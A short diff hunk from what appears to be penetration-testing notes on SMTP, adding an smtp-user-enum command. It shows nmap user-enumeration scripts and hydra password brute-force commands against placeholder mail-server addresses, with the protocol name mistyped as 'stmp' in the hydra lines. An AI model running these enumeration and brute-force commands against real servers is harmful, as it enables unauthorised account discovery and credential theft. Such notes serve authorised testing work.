@@ -23,6 +23,7 @@ nmap --script smtp-enum-users.nse -p 25,465,587 nmap.org
 nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com 256.1.1.25
 
 smtp-user-enum
+smtp-user-enum -U /usr/share/wordlists/names.txt -t 111.11.1.11 -m 150
 
 hydra -S -P /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt -e n -V stmp-enum://10.11.1.24:995
 hydra -S -l $emailaddr -P /usr/share/wordlists/rockyou.txt -e s -V stmp://10.11.1.24:995
